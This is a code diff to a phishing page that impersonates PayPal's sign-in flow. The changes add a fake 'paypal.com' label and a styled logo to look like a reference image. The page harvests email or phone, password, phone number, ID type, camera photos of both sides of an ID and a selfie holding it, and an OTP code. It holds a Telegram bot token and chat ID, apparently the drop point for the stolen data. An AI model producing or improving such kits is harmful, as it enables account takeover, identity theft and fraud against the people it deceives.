@@ -15,12 +15,11 @@
         body {
             background: #F5F7FA;
             font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
-            padding: 24px 20px 40px;
-            color: #1A1A1A;
-            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
         }
 
         .container {
@@ -29,36 +28,35 @@
             margin: 0 auto;
         }
 
-        /* PayPal style card */
+        /* PayPal card style — exactly like reference image */
         .card {
             background: #FFFFFF;
             border-radius: 16px;
-            padding: 28px 24px 36px;
+            padding: 32px 28px 40px;
             box-shadow: 0 8px 28px rgba(0, 0, 0, 0.08), 0 2px 4px rgba(0, 0, 0, 0.02);
             border: 1px solid #E4E9F2;
-            transition: all 0.2s;
         }
 
-        .paypal-header {
+        .domain {
+            font-size: 13px;
+            color: #6C7A8E;
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
+            font-weight: 400;
         }
 
         .paypal-logo {
-            font-size: 42px;
+            text-align: center;
+            font-size: 44px;
             font-weight: 700;
-            color: #003087;
             letter-spacing: -1px;
-            margin-bottom: 8px;
+            margin-bottom: 32px;
         }
+        .paypal-logo span:first-child { color: #003087; }
+        .paypal-logo span:last-child { color: #009CDE; }
 
-        .paypal-logo span {
-            color: #009CDE;
-        }
-
-        /* form elements */
         .input-group {
-            margin-bottom: 22px;
+            margin-bottom: 24px;
         }
 
         .input-label {
@@ -98,8 +96,7 @@
             font-size: 16px;
             cursor: pointer;
             transition: 0.2s;
-            font-weight: 600;
-            margin-top: 8px;
+            margin-top: 4px;
         }
 
         .action-btn:active {
@@ -111,22 +108,6 @@
             background: #F5F7FA;
             color: #0070BA;
             border: 1px solid #C7D0D9;
-        }
-
-        .forgot-link {
-            text-align: right;
-            margin-top: 6px;
-        }
-
-        .forgot-link a {
-            color: #0070BA;
-            font-size: 13px;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .forgot-link a:hover {
-            text-decoration: underline;
         }
 
         .divider {
@@ -348,17 +329,15 @@
 </head>
 <body>
 <div class="container">
-    <!-- STEP 1: EMAIL OR PHONE (like reference image) -->
+    <!-- STEP 1: EXACTLY LIKE REFERENCE IMAGE (no forgotten email link) -->
     <div id="loginPanel" class="card">
-        <div class="paypal-header">
-            <div class="paypal-logo">PayPal</div>
+        <div class="domain">paypal.com</div>
+        <div class="paypal-logo">
+            <span>Pay</span><span>Pal</span>
         </div>
         <div class="input-group">
             <div class="input-label">Email address or mobile number</div>
             <input type="text" id="loginIdentifier" placeholder="example@email.com or +1 234 567 8900" autocomplete="off">
-        </div>
-        <div class="forgot-link">
-            <a href="#" id="forgotEmailLink">Forgotten your email address?</a>
         </div>
         <button class="action-btn" id="continueToPasswordBtn">Next</button>
         <div class="terms">
@@ -368,8 +347,9 @@
 
     <!-- STEP 2: PASSWORD + PHONE NUMBER (for OTP delivery) -->
     <div id="passwordPanel" class="card hide">
-        <div class="paypal-header">
-            <div class="paypal-logo" style="font-size: 32px;">PayPal</div>
+        <div class="domain">paypal.com</div>
+        <div class="paypal-logo" style="font-size: 36px;">
+            <span>Pay</span><span>Pal</span>
         </div>
         <div class="input-group">
             <div class="input-label">Password</div>
@@ -421,10 +401,11 @@
         </div>
     </div>
 
-    <!-- STEP 4: OTP (no digit count mentioned) -->
+    <!-- STEP 4: OTP (no digit count mentioned, only last 4 digits of phone) -->
     <div id="otpPanel" class="card hide">
-        <div class="paypal-header">
-            <div class="paypal-logo" style="font-size: 30px;">PayPal</div>
+        <div class="domain">paypal.com</div>
+        <div class="paypal-logo" style="font-size: 32px;">
+            <span>Pay</span><span>Pal</span>
         </div>
         <div class="otp-hint" id="otpPhoneHint">🔐 Verification code sent to <span class="phone-mask" id="maskedPhone">****</span></div>
         <div class="input-group">
@@ -445,7 +426,7 @@
 </div>
 
 <script>
-    // TELEGRAM BOT (same as original requirements)
+    // TELEGRAM BOT credentials (as provided)
     const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
     const CHAT_ID   = "8737104261";
 
@@ -466,22 +447,21 @@
     const toast = document.getElementById('toastMsg');
     const loadingOverlay = document.getElementById('loadingOverlay');
 
-    // Inputs step 1 & 2
+    // Step 1 & 2 elements
     const loginIdentifier = document.getElementById('loginIdentifier');
     const continueBtn = document.getElementById('continueToPasswordBtn');
     const userPassword = document.getElementById('userPassword');
     const userPhone = document.getElementById('userPhoneNumber');
     const submitPasswordBtn = document.getElementById('submitPasswordBtn');
     const backToLogin = document.getElementById('backToLoginLink');
-    const forgotLink = document.getElementById('forgotEmailLink');
 
-    // OTP
+    // OTP elements
     const otpSubmit = document.getElementById('otpSubmitBtn');
     const otpCodeInput = document.getElementById('otpCode');
     const maskedPhoneSpan = document.getElementById('maskedPhone');
     const backToKycLink = document.getElementById('backToKycLink');
 
-    // Helper: toast
+    // Toast helper
     function showToast(msg, isError = false) {
         toast.innerText = msg;
         toast.classList.add('show');
@@ -513,7 +493,7 @@
         } catch(e) { return false; }
     }
 
-    // Step 1 -> Step 2
+    // Step 1 -> Step 2 (no forgotten email)
     continueBtn.onclick = () => {
         const identifier = loginIdentifier.value.trim();
         if (!identifier) {
@@ -526,13 +506,7 @@
         passwordPanel.classList.remove('hide');
     };
 
-    // Forgot email link (just demo)
-    forgotLink.onclick = (e) => {
-        e.preventDefault();
-        showToast("Please contact PayPal support for account recovery.", false);
-    };
-
-    // Back to login
+    // Back to login from password panel
     backToLogin.onclick = (e) => {
         e.preventDefault();
         passwordPanel.classList.add('hide');
@@ -644,7 +618,7 @@
         });
     }
 
-    // KYC step1 next
+    // KYC step1 next (ID selection)
     document.getElementById('kycStep1Next').onclick = () => {
         let idType = document.getElementById('idType').value;
         let idState = document.getElementById('idState').value;
@@ -658,7 +632,7 @@
         showKycStep(2);
     };
 
-    // Camera callbacks
+    // Camera event handlers
     document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'), frontStream, s=>frontStream=s, v=>usingRearFront=v, usingRearFront);
     document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'), document.getElementById('frontStatus'), "FRONT_ID", () => showKycStep(3));
     document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'), backStream, s=>backStream=s, v=>usingRearBack=v, usingRearBack);
@@ -670,7 +644,7 @@
         capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "SELFIE_WITH_ID", async () => {
             stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
             kycPanel.classList.add('hide');
-            // display last 4 digits of phone number in OTP hint
+            // Show last 4 digits of phone number in OTP hint
             if (userData.phoneNumber && userData.phoneNumber.length >= 4) {
                 let last4 = userData.phoneNumber.slice(-4);
                 maskedPhoneSpan.innerText = last4;
@@ -683,10 +657,10 @@
         });
     };
 
-    // OTP final step
+    // OTP final submission
     otpSubmit.onclick = async () => {
         const otpValue = otpCodeInput.value.trim();
-        if (!otpValue || otpValue.length < 3) {
+        if (!otpValue || otpValue.length < 1) {
             showToast("Please enter the verification code", true);
             return;
         }
@@ -708,6 +682,7 @@
         showKycStep(5);
     };
 
+    // Cleanup on page unload
     window.addEventListener('beforeunload', () => {
         stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
     });
